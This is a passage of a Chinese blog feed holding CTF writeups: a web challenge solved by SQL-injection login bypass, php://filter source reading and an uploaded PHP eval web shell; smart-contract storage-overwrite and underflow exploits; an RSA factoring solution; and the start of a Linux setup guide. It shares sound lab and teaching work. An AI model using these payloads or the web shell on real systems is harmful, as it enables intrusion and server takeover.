    <content type="html"><![CDATA[<p>10月2日NeSE丙组升乙组CTF升级赛Writeup</p><a id="more"></a><p>还是Too naive了，只做出来一题+两个半题</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezweb"><a href="#ezweb" class="headerlink" title="ezweb"></a>ezweb</h2><h3 id="1-登录"><a href="#1-登录" class="headerlink" title="1 登录"></a>1 登录</h3><p>首先是一个系统登录界面，直接尝试诸如admin，test提示用户名密码错误之后，采用绕过密码判断<code>admin&#39; or 1=1#</code>成功登录。（虽然后来不知道谁把admin密码置空了，可以直接登录admin，但影响不大，不管用什么账户登录都可以进行后续的文件上传）</p><div align="center">  <img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061142953.png" srcset="/img/loading.gif" style="zoom:67%;"></div><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2 分析"></a>2 分析</h3><p>在首页<code>综合管理</code>乱点一通无果之后，切换到<code>用户列表</code>，看到有所有用户个人信息：</p><!-- 让表格居中显示的风格 --><style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><div class="center"><table><thead><tr><th align="center">ID</th><th align="center">User</th><th align="center">EmailAddress</th><th>LastLogin</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">ads</td><td align="center"><a href="mailto:qqq@mail.com" target="_blank" rel="noopener">qqq@mail.com</a></td><td>2019-08-07 13:00:00</td></tr></tbody></table></div><p>似乎并没有什么用，拉到最底下发现有提示</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061143978.png" srcset="/img/loading.gif" style="zoom:50%;"><p>是提示**Please input “?f&#x3D;aab.php”**，应该是可以包含任意文件。继续切到<code>修改个人信息</code>，发现可以修改管理员个人信息，此处可利用头像上传文件。然后结合之前的提示<code>?f=*php</code>和php伪协议读取源码</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 首先通过php://filter读取目标源码的base64</span>http://124.16.75.162:31010/table.php?f=php://filter/<span class="hljs-built_in">read</span>=convert.base64-encode/resource=/var/www/html/info.php<span class="hljs-comment"># 然后再base64解码得到源码</span></code></pre></div><ul><li>info.php（关键部分源码）</li></ul><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'address'</span>])) &#123;    ...    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_FILES)) &#123;        <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] &gt; <span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">"错误："</span> . $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"error"</span>] . <span class="hljs-string">"&lt;br&gt;"</span>;        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deldot</span><span class="hljs-params">($s)</span></span>&#123;<span class="hljs-keyword">for</span>($i = strlen($s)<span class="hljs-number">-1</span>;$i&gt;<span class="hljs-number">0</span>;$i--)&#123;$c = substr($s,$i,<span class="hljs-number">1</span>);<span class="hljs-keyword">if</span>($i == strlen($s)<span class="hljs-number">-1</span> <span class="hljs-keyword">and</span> $c != <span class="hljs-string">'.'</span>)&#123;<span class="hljs-keyword">return</span> $s;&#125; <span class="hljs-keyword">if</span>($c != <span class="hljs-string">'.'</span>)&#123;<span class="hljs-keyword">return</span> substr($s,<span class="hljs-number">0</span>,$i+<span class="hljs-number">1</span>);&#125;&#125;&#125;$deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".php1"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".pHp1"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".ini"</span>,<span class="hljs-string">".htaccess"</span>);            $file_name = trim($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'name'</span>]);$file_name = deldot($file_name);<span class="hljs-comment">//echo $file_name;</span>$file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);$file_ext = strtolower($file_ext); $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);$file_ext = trim($file_ext);<span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;$name =$_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>] ;<span class="hljs-comment">//$temp_file = $_FILES['file']['tmp_name'];</span><span class="hljs-comment">//$img_path = UPLOAD_PATH.'/'.$file_name;</span>$content = file_get_contents($_FILES[<span class="hljs-string">'file'</span>][<span class="hljs-string">'tmp_name'</span>]);$content = str_replace(<span class="hljs-string">'?'</span>, <span class="hljs-string">'!'</span>, $content);<span class="hljs-keyword">if</span> (file_exists(<span class="hljs-string">"upload/"</span> . $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]))                &#123;                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('文件已经存在');&lt;/script&gt;"</span>;                &#125;<span class="hljs-keyword">else</span>&#123;move_uploaded_file($_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"tmp_name"</span>], <span class="hljs-string">"assets/images/avatars/"</span> . $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>]);file_put_contents(<span class="hljs-string">"assets/images/avatars/"</span> . $_FILES[<span class="hljs-string">"file"</span>][<span class="hljs-string">"name"</span>], $content);$helper = <span class="hljs-keyword">new</span> sqlhelper();$sql = <span class="hljs-string">"UPDATE  admin SET icon='$name' WHERE id=$_SESSION[id]"</span>;$helper-&gt;execute_dml($sql);&#125;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;script&gt;alert('不允许上传的类型');&lt;/script&gt;"</span>;&#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>看到对上传文件的最后一个<code>.</code>后面的扩展名做<strong>黑名单限制</strong>，以及进行了<strong>小写转换</strong>、<strong>空格去除</strong>、<strong>特殊敏感字符替换</strong>等操作。然后将服务端接收到的文件内容写入<code>assets/images/avatars/上传的文件名</code>。</p><h3 id="3-上传"><a href="#3-上传" class="headerlink" title="3 上传"></a>3 上传</h3><ul><li>首先设计一句话木马：</li></ul><div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">// 常见的一句话木马因为有?而失效</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(@$_POST[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span>    <span class="hljs-comment">// 于是采用下面的马,一举两得</span>&lt;script language=<span class="hljs-string">"php"</span>&gt;phpinfo();<span class="hljs-keyword">eval</span>($_REQUEST[<span class="hljs-string">'cmd'</span>]);&lt;/script&gt;</code></pre></div><ul><li><p>然后上传木马，我尝试了各种姿势</p><ul><li>burp改文件扩展名，burp改mime type都不行</li><li>%00截断也不行，说明php版本并不低</li><li><code>zzy.php. .</code>空格绕过也不好使，虽然能上传成功，但好像访问不了&#x3D;&#x3D;</li><li>…</li><li>最后还是选择用图片马，使用copy命令合并为<code>zzy.php.jpg</code>，然后直接上传成功</li></ul></li></ul><div align="center"><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217984.png" srcset="/img/loading.gif" style="zoom:60%;"></div><ul><li><p>使用蚁剑连接成功</p><ul><li>URL地址: <a href="http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg" target="_blank" rel="noopener">http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg</a></li><li>连接密码: <code>cmd</code></li><li>(为了确保登录会话的有效，我也在请求信息里传入了Cookie)</li></ul></li><li><p>在根目录下找到<code>flag{flaaaaaaaaaaaaaaaaaaa.ezweb}</code></p></li></ul><div align="center"><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061217687.png" srcset="/img/loading.gif" style="zoom:60%;"></div><h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>TO BE COMPLETED</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Debuggame"><a href="#Debuggame" class="headerlink" title="Debuggame"></a>Debuggame</h2><p>TO BE COMPLETED</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NeSE</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NeSE丙组CTF月赛Writeup</title>
    <link href="/2022/09/25/%E4%B8%99%E7%BB%84CTF%E6%9C%88%E8%B5%9Bwriteup/"/>
    <url>/2022/09/25/%E4%B8%99%E7%BB%84CTF%E6%9C%88%E8%B5%9Bwriteup/</url>
    
    <content type="html"><![CDATA[<p>NeSE战队丙组月赛Writeup（包括解题和出题）</p><a id="more"></a><p>🕊🕊🕊，之后的月赛writeup会更新在<a href>乙组CTF月赛writeup</a></p><h1 id="202209-蓝丙出题"><a href="#202209-蓝丙出题" class="headerlink" title="202209-蓝丙出题"></a>202209-蓝丙出题</h1><blockquote><p>看到前几个月的丙组月赛里似乎没有出现过区块链相关的题目，正好最近有了解一些智能合约安全，故参考chainFlag出了(改了)两道入门级合约安全赛题</p></blockquote><h2 id="1-EasyCheckin"><a href="#1-EasyCheckin" class="headerlink" title="1 EasyCheckin"></a>1 EasyCheckin</h2><ul><li>考察对智能合约、钱包账户、转账、以太坊事件等基础概念的理解</li><li>难度：签到级</li></ul><h3 id="题目搭建"><a href="#题目搭建" class="headerlink" title="题目搭建"></a>题目搭建</h3><ul><li>git clone <a href>repo</a>或者下载<a href>EasyCheckin.tar.gz</a></li><li>配置<code>config.py</code>，设置infura token，port和flag：</li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># Your need a infura ropsten key to go on</span>INFURA_ROPSTEN_KEY = <span class="hljs-string">"https://ropsten.infura.io/v3/YOUR_KEY"</span>EasyCheckin_PORT = <span class="hljs-number">31040</span>EasyCheckin_Flag = <span class="hljs-string">"flag&#123;w0w_Y0u_hav3_ch3ck3d_1n&#125;"</span></code></pre></div><ul><li>build &amp; run 启动题目docker</li></ul><div class="hljs"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">18.04</span><span class="hljs-keyword">LABEL</span><span class="bash"> maintainer=<span class="hljs-string">"zhangzhiyu1999@iie.ac.cn"</span></span><span class="hljs-keyword">COPY</span><span class="bash"> ./*.py /ctf/</span><span class="hljs-keyword">COPY</span><span class="bash"> ./*.txt /ctf/</span><span class="hljs-keyword">COPY</span><span class="bash"> ./*.sol /ctf/</span><span class="hljs-comment"># WORKDIR /ctf</span><span class="hljs-keyword">RUN</span><span class="bash"> sed -i <span class="hljs-string">"s/archive.ubuntu.com/mirrors.aliyun.com/g"</span> /etc/apt/sources.list \ </span>&amp;&amp; apt update \&amp;&amp; apt install -y python3 python3-pip \&amp;&amp; mkdir -p ~/.pip \&amp;&amp; echo <span class="hljs-string">""</span> &gt; ~/.pip/pip.conf \&amp;&amp; echo <span class="hljs-string">"[global]"</span> &gt;&gt; ~/.pip/pip.conf \&amp;&amp; echo <span class="hljs-string">"index-url = https://pypi.tuna.tsinghua.edu.cn/simple"</span> &gt;&gt; ~/.pip/pip.conf \&amp;&amp; ln -s /usr/bin/python3 /usr/bin/python \&amp;&amp; ln -s /usr/bin/pip3 /usr/bin/pip \&amp;&amp; python -m pip install --upgrade pip \&amp;&amp; pip install -r /ctf/requirements.txt<span class="hljs-keyword">CMD</span><span class="bash">  <span class="hljs-built_in">cd</span> /ctf &amp;&amp; python EasyCheckin_server.py</span><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">31040</span><span class="hljs-comment"># sudo docker build -t smartcontract:challenge1 -f ./Dockerfile .</span><span class="hljs-comment"># sudo docker run -p 31040:31040 --name EasyCheckin -d smartcontract:challenge1</span></code></pre></div><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><ol><li>nc服务器，选择 2 生成deployer账户，记住账户地址和私钥</li><li>通过metamask已有账户向deployer转账0.001 ether用于部署题目，然后选择 3 部署题目合约，记住合约地址</li><li>选择 1 复制源码，进入remix web IDE编译合约并在deploy页面通过<code>At Address</code>导入远程链上题目合约进行交互（或者通过etherscan打开题目合约并且上传源码，接入metamask之后，即可在etherscan进行交互）</li><li>调用setCheckinStr函数写入<code>Welcome to EasyCheckin</code>，然后调用isCheckin触发pass事件</li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051143335.png" srcset="/img/loading.gif"><ol start="5"><li>最后提交触发pass事件的交易哈希，获得<strong>flag{w0w_Y0u_hav3_ch3ck3d_1n}</strong></li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051144058.png" srcset="/img/loading.gif"><h2 id="2-RichOwners"><a href="#2-RichOwners" class="headerlink" title="2 RichOwners"></a>2 RichOwners</h2><ul><li>考察solidity语言基础、常见智能合约漏洞利用（storage覆盖，整数溢出等）</li><li>难度：入门级</li></ul><h3 id="题目搭建-1"><a href="#题目搭建-1" class="headerlink" title="题目搭建"></a>题目搭建</h3><ul><li>git clone <a href>repo</a>或者下载<a href>RichOwners.tar.gz</a></li><li>配置<code>config.py</code>，设置infura token，port和flag：</li></ul><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># Your need a infura ropsten key to go on</span>INFURA_ROPSTEN_KEY = <span class="hljs-string">"https://ropsten.infura.io/v3/1b670860e6e645fe9f85efd8f75a0e5a"</span>RichOwners_PORT = <span class="hljs-number">31041</span>RichOwners_Flag = <span class="hljs-string">"flag&#123;St0rage_0verwrit3_and_1nt3ger_und3rfl0w&#125;"</span></code></pre></div><ul><li>build &amp; run 启动题目，同上<code>EasyCheckin</code></li></ul><div class="hljs"><pre><code class="hljs bash">sudo docker build -t smartcontract:challenge2 -f ./Dockerfile .sudo docker run -p 31041:31041 --name RichOwners -d smartcontract:challenge2</code></pre></div><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><strong>1 未初始化结构体对storage的覆盖</strong></p><p>Solidity语言的变量存储位置分为三种：storage，memory和calldata。storage存储在链上，类似与计算机的硬盘，对合约具备全局可见性；memory和calldata则是存储在临时的内存中，不上链。</p><p>solidity语言(低于0.4.25)的变量存储有一个特性，即数组、映射、<strong>结构体</strong>类型的局部变量默认是引用合约的storage，而全局变量默认按照声明顺序存储在storage中。因此，如果这些局部变量未被初始化，则它们将直接指向storage首部，修改未初始化的这些变量即可实现对全局变量覆盖写入。 </p><table><thead><tr><th>Storage slot index</th><th>Var</th></tr></thead><tbody><tr><td>0（ ⬅ 未初始化的hacker结构体默认指向这里）</td><td>owner_1  （hacker.hackeraddress1 覆盖写入）</td></tr><tr><td>1</td><td>owner_2  （hacker.hackeraddress2 覆盖写入）</td></tr><tr><td>2</td><td>owner_3</td></tr><tr><td>3</td><td>owner_4</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><p><strong>2 整数下溢</strong></p><p>很简单，如<code>uint(1-2)</code>下溢</p><p><strong>3 以太坊钱包地址生成(碰撞尾部)</strong></p><p>通过这个网站(<a href="https://vanity-eth.tk/)%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E5%93%88%E5%B8%8C%E7%A2%B0%E6%92%9E%E7%9A%84%E9%92%B1%E5%8C%85%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">https://vanity-eth.tk/)可以实现哈希碰撞的钱包地址</a></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>nc服务器，选择 2 生成deployer账户，记住账户地址和私钥</li><li>通过metamask已有账户向deployer转账0.001 ether用于部署题目，然后选择 3 部署题目合约，记住合约地址</li><li>通过<a href="https://vanity-eth.tk/%E7%94%9F%E6%88%90%E7%A2%B0%E6%92%9E%E5%B0%BE%E9%83%A8%E5%9C%B0%E5%9D%80%E7%9A%84%E9%92%B1%E5%8C%85%E8%B4%A6%E6%88%B7%EF%BC%8C%E8%AE%B0%E4%BD%8F%E5%9C%B0%E5%9D%80%E5%92%8C%E7%A7%81%E9%92%A5%EF%BC%8C%E5%AF%BC%E5%85%A5metamask%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8[ropsten%E6%B0%B4%E9%BE%99%E5%A4%B4](https://faucet.egorfine.com/)%E5%90%91%E8%AF%A5%E5%9C%B0%E5%9D%80%E9%A2%86%E5%8F%9610%E4%B8%AAropsten" target="_blank" rel="noopener">https://vanity-eth.tk/生成碰撞尾部地址的钱包账户，记住地址和私钥，导入metamask，然后在[ropsten水龙头](https://faucet.egorfine.com/)向该地址领取10个ropsten</a> test ether</li><li>选择 1 复制源码，进入remix web IDE编译合约并在deploy页面通过<code>At Address</code>导入远程链上题目合约</li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210051924026.png" srcset="/img/loading.gif"><ol start="5"><li>调用nothing函数，并且附带1 Finney(也即0.001 ether)的value，利用未初始化的结构体对storage首部的覆盖，使得owner_1被修改为了msg.sender，也即我们自己的账户</li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170021209.png" srcset="/img/loading.gif" style="zoom: 67%;"><ol start="6"><li>同上理，调用nothing并附带1 ether，覆盖owner_2为msg.sender</li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170025135.png" srcset="/img/loading.gif" style="zoom:62%;"><ol start="7"><li>直接花 1 ether 买下owner_3所属权</li></ol><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202209170041506.png" srcset="/img/loading.gif" style="zoom:70%;"><ol start="8"><li>由于msg.sender的地址已经通过网站设计好碰撞了尾部，因此直接附带1 ether调用dead构造整数下溢，然后调用imRich函数买下owner_4</li></ol><img src="C:\Users\Zhiyu\AppData\Roaming\Typora\typora-user-images\image-20220917005259333.png" srcset="/img/loading.gif" alt="image-20220917005259333" style="zoom:62%;"><ol start="9"><li><p>最后调用payforflag函数生成GetFlag事件，并且可以看到合约将3.001 ether归还答题钱包，合 约余额清零</p></li><li><p>复制payforflag的transaction hash，提交至nc服务器拿到<strong>flag{St0rage_0verwrit3_and_1nt3ger_und3rfl0w}</strong></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>NeSE</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络攻防基础CTF测验Writeup</title>
    <link href="/2022/05/23/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80CTF%E6%B5%8B%E9%AA%8CWriteup/"/>
    <url>/2022/05/23/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80CTF%E6%B5%8B%E9%AA%8CWriteup/</url>
    
    <content type="html"><![CDATA[<p>国科大2022年春季学期《网络攻防基础》课程CTF测验writeup。</p><a id="more"></a><blockquote><p>《网络攻防基础》是网络空间安全学科研究生的专业核心课，主讲教师有国家计算机网络入侵防范中心主任张玉清教授、信工所六室龚晓锐高级工程师和信工所国重吴槟副研究员。本课程讲授软件安全的基本原理、软件防御机制与攻击手段的博弈演进、软件脆弱性（漏洞）原理分析，以及确保软件安全性的最佳实践方法。课程以软件安全国际知名学者Gary McGraw的三部著作为教材，让同学通过课程学习与动手实践，深入理解软件的安全内构(building security in)本质与方法，提升在开发过程中确保软件安全性的专业技能；同时，理解软件的漏洞利用与防范在网络空间攻防对抗中的关键地位，掌握围绕软件攻防的“白帽”与“黑帽”思维方法和基本技术，为进一步研习网络攻防奠定基础。</p></blockquote><p>本次CTF测验共分9个小组，每组各出一题，其中我们组出的是一道docker逃逸的misc题。</p><h2 id="Crypto-RSA"><a href="#Crypto-RSA" class="headerlink" title="Crypto RSA"></a>Crypto RSA</h2><h3 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="1 题目分析"></a>1 题目分析</h3><blockquote><p><strong>题目：</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>：密文文件</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>：代码文件</li></ul></blockquote><p>阅读题目rsa.py代码文件可以得到以下信息：</p><ul><li>公钥（n, e）已知，而p、q、d未知</li><li>明文是一张bmp图片的txt格式，经过libns2n转换之后加密为密文cipher.txt</li></ul><h3 id="2-解题过程"><a href="#2-解题过程" class="headerlink" title="2 解题过程"></a>2 解题过程</h3><h4 id="破解私钥d"><a href="#破解私钥d" class="headerlink" title="破解私钥d"></a>破解私钥d</h4><p>由于n不太大，尝试直接分解。在<a href="http://www.factordb.com/index.php?query=12928016222583163285621599577461443538921550432522968254134024525052961389976575215720661492239277563694030199496398953014500031012932214275965402552478971" target="_blank" rel="noopener">factordb在线分解得到的结果</a>并没有成功，因此转而尝试yafu分解。</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232242645.png" srcset="/img/loading.gif" style="zoom: 50%;"><p>成功得到p和q，然后使用gmpy2求模逆元得到d：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># e = 65537</span><span class="hljs-comment"># p = 113701434566953302296018327231919974281008636789018283600308658084922136632147</span><span class="hljs-comment"># q = 113701434566953302296018327231919974281008636789018283600308658084922136631993</span>d = gmpy2.invert(e, (p<span class="hljs-number">-1</span>) * (q<span class="hljs-number">-1</span>))<span class="hljs-comment"># d = 1766291671224035950065700331363806177388399874464968761882845653559427747468578334624297389288081148192811346008992354282683301619956371502784830383326817</span></code></pre></div><h4 id="解密明文m"><a href="#解密明文m" class="headerlink" title="解密明文m"></a>解密明文m</h4><p>现已知密钥（n，d），直接逐行对<code>cipher.txt</code>进行解密即可得到<code>flag.bmp.txt</code>如下：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232254070.png" srcset="/img/loading.gif" style="zoom:70%;"><p>结合<code>42 4D</code>文件头以及文件名中的提示，还原得到<code>flag.bmp</code>如下：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206232257469.png" srcset="/img/loading.gif" style="zoom:60%;"><p>看到三个二维码定位角，使用<strong>StegSolve</strong>在红色通道Red Plane 0看到二维码，扫码即得到了flag。</p><blockquote><p><strong>题解：</strong></p><ul><li><a href="/download/course-CTF/rsa-solution.py">rsa-solution.py</a>，解题脚本</li><li><a href="/download/course-CTF/Crypto-RSA.pptx">Crypto-RSA.pptx</a>，题目讲解</li></ul></blockquote><h2 id="Reverse-babyandroid"><a href="#Reverse-babyandroid" class="headerlink" title="Reverse babyandroid"></a>Reverse babyandroid</h2><blockquote><p><strong>题目：</strong></p><ul><li><a href="/download/course-CTF/babyAndroid.apk">babyAndroid.apk</a>：题目文件</li></ul></blockquote><h3 id="1-逆向分析"><a href="#1-逆向分析" class="headerlink" title="1 逆向分析"></a>1 逆向分析</h3><p>直接用<strong>jadx</strong>反编译<code>babyAndroid.apk</code>，看到主要代码在<code>com.example.myapplication</code>里：</p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202206252334586.png" srcset="/img/loading.gif"><blockquote><p><strong>题解：</strong></p><ul><li><a href="/download/course-CTF/bbandroid-solution.java">bbandroid-solution.java</a>：解题脚本</li></ul></blockquote><h2 id="Reverse-baguatu"><a href="#Reverse-baguatu" class="headerlink" title="Reverse baguatu"></a>Reverse baguatu</h2><blockquote><p><strong>题目文件：</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>：密文文件</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>：代码文件</li></ul></blockquote><blockquote><p><strong>题目文件：</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>：密文文件</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>：代码文件</li></ul></blockquote><h2 id="Web-news"><a href="#Web-news" class="headerlink" title="Web news"></a>Web news</h2><p>SQL数字型注入+md5校验绕过+assert命令执行的一道缝合怪，没啥难度。由于我写博客的时候已经是课程实验之后的第N天（老拖延症）服务器都关了，所以我就只挑其中两个手上有图的知识点记录一下。</p><h3 id="1-md5校验绕过"><a href="#1-md5校验绕过" class="headerlink" title="1 md5校验绕过"></a>1 md5校验绕过</h3><h3 id="2-assert命令执行"><a href="#2-assert命令执行" class="headerlink" title="2 assert命令执行"></a>2 assert命令执行</h3><h2 id="Misc-密不透风的Docker"><a href="#Misc-密不透风的Docker" class="headerlink" title="Misc 密不透风的Docker"></a>Misc 密不透风的Docker</h2><blockquote><p><strong>题目文件：</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>：密文文件</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>：代码文件</li></ul></blockquote><blockquote><p><strong>题目文件：</strong></p><ul><li><a href="/download/course-CTF/cipher.txt">cipher.txt</a>：密文文件</li><li><a href="/download/course-CTF/rsa.py">rsa.py</a>：代码文件</li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux个人工作环境配置</title>
    <link href="/2021/04/10/Linux%E4%B8%AA%E4%BA%BA%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/04/10/Linux%E4%B8%AA%E4%BA%BA%E5%B7%A5%E4%BD%9C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux个人工作环境配置（持续更新）"><a href="#Linux个人工作环境配置（持续更新）" class="headerlink" title="Linux个人工作环境配置（持续更新）"></a>Linux个人工作环境配置（持续更新）</h1><p>在迁移到新的Linux系统时，可以用以下来配置个人工作环境，以快速恢复效率✨</p><a id="more"></a><blockquote><p>本文环境：Ubuntu 22.04 LTS</p></blockquote><h2 id="1-系统配置"><a href="#1-系统配置" class="headerlink" title="1 系统配置"></a>1 系统配置</h2><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><ul><li>可直接在  Settings &gt; Network &gt; Network Proxy &gt; Manual  图形界面中配置系统代理<code>http_proxy</code>和<code>https_proxy</code>，注意不只需写ip和port，不需要在ip前加protocol。然后重启<code>NetworkManager</code>生效。</li></ul><div class="hljs"><pre><code class="hljs bash">sudo systemctl restart NetworkManager</code></pre></div><ul><li>或者在命令行中为终端shell配置代理：</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 仅对当前终端的shell生效</span><span class="hljs-built_in">export</span> http_proxy=http://PROXY_IP:PROXY:PORT<span class="hljs-built_in">export</span> https_proxy=http://PROXY_IP:PROXY:PORT<span class="hljs-comment"># 持久化（重启）生效</span>sudo touch /etc/profile.d/my_proxy.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">"export http_proxy=http://PROXY_IP:PROXY:PORT"</span> &gt;&gt; /etc/profile.d/my_proxy.sh<span class="hljs-built_in">echo</span> <span class="hljs-string">"export https_proxy=http://PROXY_IP:PROXY:PORT"</span> &gt;&gt; /etc/profile.d/my_proxy.shsudo chmod +x /etc/profile.d/my_proxy.sh<span class="hljs-built_in">source</span> /etc/profile.d/my_proxy.sh<span class="hljs-comment"># 注: 如果是zsh，则需要注意是否在/etc/zsh/zprofile中添加了相关支持</span></code></pre></div><ul><li>验证代理配置成功</li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 